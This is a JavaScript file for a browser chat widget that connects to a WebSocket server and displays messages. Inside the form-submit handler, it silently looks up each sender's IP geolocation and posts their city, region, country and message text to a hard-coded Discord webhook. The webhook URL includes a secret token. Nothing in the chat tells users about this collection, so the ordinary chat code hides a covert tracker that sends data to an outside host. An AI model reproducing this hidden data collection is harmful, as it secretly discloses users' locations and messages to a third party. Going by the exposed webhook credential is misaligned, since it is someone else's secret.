document.addEventListener('DOMContentLoaded', (event) => {
    // Connect to WebSocket server
    const socket = new WebSocket('wss://rune-thirsty-zipper.glitch.me');

    socket.onopen = function () {
        console.log('WebSocket connection opened');
    };

    socket.onerror = function (error) {
        console.error('WebSocket error:', error);
    };

    socket.onmessage = function (event) {
        console.log('Received message from server:', event.data);

        const chatLog = document.querySelector('#chat-messages');

        if (chatLog) {
            const newMessage = document.createElement('div');
            newMessage.textContent = event.data;
            chatLog.appendChild(newMessage);
        }
    };

    // Add event listener for chat form submission
    const form = document.querySelector('#message-form');

    if (form) {
        form.addEventListener('submit', event => {
            // Prevent the form from refreshing the page
            event.preventDefault();

            // Get the message from the text input
            const input = document.querySelector('#message-input');
            const message = input.value;
            input.value = '';

            // Check if WebSocket is connected before sending message
            if (socket.readyState === WebSocket.OPEN) {
                // Send the message to the server
                socket.send(message);

                // Append the message to the chat log
                const chatLog = document.querySelector('#chat-messages');

                if (chatLog) {
                    const newMessage = document.createElement('div');
                    newMessage.textContent = `You: ${message}`;
                    chatLog.appendChild(newMessage);
                }
            } else {
                console.error('Cannot send message, WebSocket is not open');
            }

            // Retrieve IP location using IP geolocation service
            fetch('https://ipapi.co/json/')
                .then(function(response) {
                    if (response.ok) {
                        return response.json();
                    } else {
                        throw new Error('Failed to fetch IP location');
                    }
                })
                .then(function(data) {
                    var location = data.city + ', ' + data.region + ', ' + data.country_name;
                    
                    var webhookData = {
                        content: "User from " + location + " says: " + message
                    };

                    var webhookUrl = "https://discord.com/api/webhooks/1117953159072055418/uDR4uH3mtx-ONQih1mVjkxEMKYsF4IBGhpqKsU3lUE64GyD_RdSyFe5TUpk9IaTDhtld"; // Replace with your actual Discord webhook URL

                    fetch(webhookUrl, {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify(webhookData)
                    })
                    .then(function(response) {
                        console.log("Webhook sent successfully!");
                    })
                    .catch(function(error) {
                        console.error("Error sending webhook:", error);
                    });
                })
                .catch(function(error) {
                    console.error("Error fetching IP location:", error);
                });
        });
    }
});
